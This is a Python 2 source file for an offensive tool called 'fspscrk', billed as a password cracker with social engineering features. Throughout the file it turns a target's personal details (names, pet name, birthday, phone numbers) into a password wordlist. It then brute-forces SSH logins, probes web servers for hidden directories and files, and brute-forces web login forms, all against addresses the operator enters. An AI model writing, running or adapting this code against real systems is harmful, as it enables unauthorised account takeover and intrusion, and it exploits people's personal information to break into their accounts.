from os import R_OK
from progressbar import *

import os
import sys
import time
import Queue
import socket
import urllib
import urllib2
import readline
import mechanize
import paramiko


# SSH bruteforce util
class SSHbrutus(object):

    def __init__(self, trgt, usr, fobj):
        self.trgt = trgt
        self.usr = usr
        self.fobj = fobj


    def exists(self):
        # Tests if the file exists and if the executing user has read access
        # to the file. Returns file if both tests are passed.
        if not os.path.isfile(self.fobj):
            print '[-] File not found: {0}'.format(self.fobj)
            sys.exit(1)

        if not os.access(self.fobj, R_OK):
            print '[-] Denied read access: {0}'.format(self.fobj)
            sys.exit(1)

        if os.path.isfile(self.fobj) and os.access(self.fobj, R_OK):
            return self.fobj


    def ssh_connect(self, passwd, code=0):
        # Connects to the SSH server, attempts to authenticate and returns the
        # exit code from the attempt.
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.trgt, port=22, username=self.usr, password=passwd, timeout=2)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error, err:
            code = 2, err

        ssh.close()
        return code


    def start(self):
        # Iterate trough the password list and checks wheter or not the
        # correct password has been found.
        fobj = self.exists()
        wlist = open(fobj)

        for i in wlist.readlines():
            passwd = i.strip("\n")
            resp = self.ssh_connect(passwd)

            if type(resp) == int:

                if resp == 0:
                    print "[+] User: {0}".format(self.usr)
                    print "[+] Password found!: {0}".format(passwd)
                    break

                if resp == 1:
                    print "[-] User: {0} Password: {1}".format(self.usr, passwd)

            elif resp[0] == 2:
                print "[!] {0}: {1}".format(resp[1], self.trgt)
                break

        wlist.close()



# WEB bruteforce util
class WEBbrutus(object):

    def __init__ (self, target, file):
        self.threads = 5
        self.target_url = target
        self.wordlist = file
        self.resume = None
        self.user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefor/19.0"
        self.word_queue = self.build_wordlist(self.wordlist)
        self.extensions = [".txt",".php",".bak",".orig",".inc",".doc"]
        self.line = "\n------------------------------------------------------------------------\n"
        self.brute_result = False


    def build_wordlist(self, wordlist):
         # Le a lista de palavras
        wordlist = self.wordlist
        fd = open(self.wordlist,"rb")
        raw_words = fd.readlines()
        fd.close()
        found_resume = False
        words = Queue.Queue()

        for word in raw_words:
            word = word.rstrip()
            if self.resume is not None:
                if found_resume:
                    words.put(word)
                else:
                    if word == resume:
                        found_resume = True
                        print "[*] Resuming wordlist from: %s" % resume
            else:
                words.put(word)
        return words


    def form_attempt(self, user, password):
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.open(self.target_url)
        br.select_form(nr=0)
        br['{}'.format(self.login)] = user
        br['{}'.format(self.psswd)] = password
        br.submit()
        response = br.response()
        response_url = response.geturl()
        print "[*] [User:{} Pass:{}] = {}".format(user, password, response_url)

        # if correct password found, signal the bruter to stop.
        if response_url == self.target_url:
            return True


    def form_bruter(self):
        try:
            self.login = raw_input("[+] Enter the ID of the username box: ")
            self.psswd = raw_input("[+] Enter the ID of the password box: ")
            self.user  = raw_input("[+] Enter the username to brute-force the formulary: ")

            print
            print "[+] Begin Task: webform password bruteforce."
            input_file = open(self.wordlist)

            for i in input_file.readlines():
                try:
                    password = i.strip("\n")
                    self.brute_result = self.form_attempt(self.user, password)
                    if self.brute_result == True:
                        print "[*] End Task: bruteforce complete."
                        print "[*] Password: {}".format(password)
                        break

                except KeyboardInterrupt:
                    break
        except Exception as e:
            print "[!] Exception caught, check the fields according to the HTML page, Error: {}".format(e)



    def dir_bruter(self, word_queue,extensions=None):
        while not self.word_queue.empty():
            attempt = self.word_queue.get()
            attempt_list = []
            attempt_list.append("%s" % attempt)
            if "." not in attempt:
                attempt_list.append("%s/" % attempt)
            else:
                attempt_list.append("%s" % attempt)
            if extensions:
                for extension in extensions:
                    attempt_list.append("%s%s" % (attempt,extension))


            try:
                for brute in attempt_list:
                    url = "%s%s" % (self.target_url,urllib.quote(brute))
                    try:
                        headers = {}
                        headers["User-Agent"] = self.user_agent
                        r = urllib2.Request(url,headers=headers)
                        response = urllib2.urlopen(r)
                        if len(response.read()):
                            print "[%d] ==> %s" % (response.code,url)
                    except urllib2.URLError,e:
                        if e.code != 404:
                            print "!!! %d => %s" % (e.code,url)
                        pass
            except KeyboardInterrupt:
                break


    def start(self,mode):
        if mode == 'url':
            try:
                self.dir_bruter(self.word_queue,self.extensions,)
            except KeyboardInterrupt:
                print "\n[-] Current session ended as user requested."

        elif mode == 'form':
            try:
                self.form_bruter()

            except KeyboardInterrupt:
                print "\n[-] Current session ended as user requested."


    def stop(self,mode):
        if mode == 'url':
            try:
                print "[-] Content URL bruter finalized."
            except Exception as e:
                print "[!] Exception caught: {}".format(e)

        elif mode == 'form':
            try:
                print "[-] Brute-Form authentication finalized."
            except Exception as e:
                print "[!] Exception caught: {}".format(e)




class pscrk(object):

    name    = "fspscrk "
    desc    = "fsociety password cracker with social engineering features."
    version = "0.8"

    def __init__(self):
        # define some global variables

        # script path
        self.path = os.path.abspath(os.path.dirname(sys.argv[0]))

        # variables
        self.targets   = None
        self.file      = None
        self.interface = None
        self.gateway   = None
        self.port      = 80
        self.domain    = None
        self.redirect  = None
        self.script    = None
        self.filter    = None
        self.arpmode   = "rep"

        # target personal info
        # first_name, last_name. nickname, petname, birthday, num_tel, num_mobile
        self.target_info = ['n/a', 'n/a', 'n/a', 'n/a', 'n/a', 'n/a', 'n/a']
        self.mixed_psw = []
        self.cwl_available = False

        # status
        self.ssh_status  = False
        self.url_status  = False
        self.form_status = False


    def printBanner(self):
        print
        print self.name + self.version
        print "=============================================================="
        print self.desc


    def printMenu(self):
        print
        print "[*] Available attacks:"
        print "    (0) Configuration   - Set Target's Personal Info"
        print "    (1) SSH Bruteforce  - SSH Brute-Force Attack"
        print "    (2) URL Bruteforce  - URL Content Buster"
        print "    (3) FORM Bruteforce - Webpage Formulary Brute-Force Attack"
        print


    def mixPsw(self):
        for i in range(0,6):
            for j in range(0,6):
                self.mixed_psw.append(self.target_info[i] + self.target_info[j])


    def start(self):
        try:
            self.printBanner()

            while True:
                self.printMenu()
                self.command = raw_input("[fspscrk]> ")


                if self.command == '0':
                    print "[*] Target's personal info configuration."
                    self.target_info[0] = raw_input("[+] (1/7) Please enter first name            : ")
                    self.target_info[1] = raw_input("[+] (2/7) Please enter last name             : ")
                    self.target_info[2] = raw_input("[+] (3/7) Please enter nickname              : ")
                    self.target_info[3] = raw_input("[+] (4/7) Please enter petname               : ")
                    self.target_info[4] = raw_input("[+] (5/7) Please enter birthday              : ")
                    self.target_info[5] = raw_input("[+] (6/7) Please enter tel number (home/work): ")
                    self.target_info[6] = raw_input("[+] (7/7) Please enter mobile number         : ")
                    print "[*] Configuration complete. Creating password list using the given info..."
                    self.mixPsw()
                    self.cwl_available = True


                elif self.command == '1':
                    print "[*] SSH Bruter initialized."

                    try:
                        self.targets = raw_input("[+] Please enter target SSH Server IP Address: ")

                        # if a wordlist created with target's info is available, write all mixed password to a file and use it.
                        if self.cwl_available:
                            self.choice  = raw_input("[*] Would you like to use the wordlist you just created with target's info? (y/n)")
                            if self.choice == 'y' or self.choice == 'Y':
                                # create an empty file.
                                open("cwl.list", 'a').close()
                                self.file = "cwl.list"
                                # write all mixed password to it.
                                self.fd = open(self.file,'w')
                                for word in self.mixed_psw:
                                    self.fd.write(word + '\n')
                                self.fd.close()

                        else:
                            self.file = raw_input("[+] Please enter your password list: ")
                            print "[*] Reading from password list..."

                        username = raw_input("[+] Please enter the username to brute-force the SSH Server: ")

                        # run the bruteforcer
                        self._ssh_bruter = SSHbrutus(self.targets, username, self.file)
                        self._ssh_bruter.start()

                    except KeyboardInterrupt:
                        pass


                elif self.command == '2':
                    print "[*] Content URL bruter initialized."

                    try:
                        self.targets = raw_input("[+] Please enter target website url: ")

                        # if a wordlist created with target's info is available, write all mixed password to a file and use it.
                        if self.cwl_available:
                            self.choice  = raw_input("[*] Would you like to use the wordlist you just created with target's info? (y/n)")
                            if self.choice == 'y' or self.choice == 'Y':
                                # create an empty file.
                                open("cwl.list", 'a').close()
                                self.file = "cwl.list"
                                # write all mixed password to it.
                                self.fd = open(self.file,'w')
                                for word in self.mixed_psw:
                                    self.fd.write(word + '\n')
                                self.fd.close()

                        else:
                            self.file = raw_input("[+] Please enter your password list: ")
                            print "[*] Reading from password list..."

                        # run the bruteforcer
                        self._web_bruter = WEBbrutus(self.targets, self.file)
                        self._web_bruter.start("url")

                    except KeyboardInterrupt:
                        self._web_bruter.stop("url")


                elif self.command == '3':
                    print "[*] Brute-Form authentication initialized."
                    print "    First get the source of the web page formulary and get the id= value of the login and password."
                    print "    Show the redirect results of the attempt so if goes to a different page may have worked."
                    print

                    try:
                        self.targets = raw_input("[+] Please enter target website url: ")

                        # if a wordlist created with target's info is available, write all mixed password to a file and use it.
                        if self.cwl_available:
                            self.choice  = raw_input("[*] Would you like to use the wordlist you just created with target's info? (y/n)")
                            if self.choice == 'y' or self.choice == 'Y':
                                # create an empty file.
                                open("cwl.list", 'a').close()
                                self.file = "cwl.list"
                                # write all mixed password to it.
                                self.fd = open(self.file,'w')
                                for word in self.mixed_psw:
                                    self.fd.write(word + '\n')
                                self.fd.close()

                        else:
                            self.file = raw_input("[+] Please enter your password list: ")
                            print "[*] Reading from password list..."

                        # run the bruteforcer
                        self._web_bruter = WEBbrutus(self.targets, self.file)
                        self._web_bruter.start("form")

                    except KeyboardInterrupt:
                        self._web_bruter.stop("form")

                else:
                    print "[-] Error: Please enter a vaild option. Retry:"

        except KeyboardInterrupt:
            print "\n[-] Current session ended as user requested."


_pscrk = pscrk()
_pscrk.start()
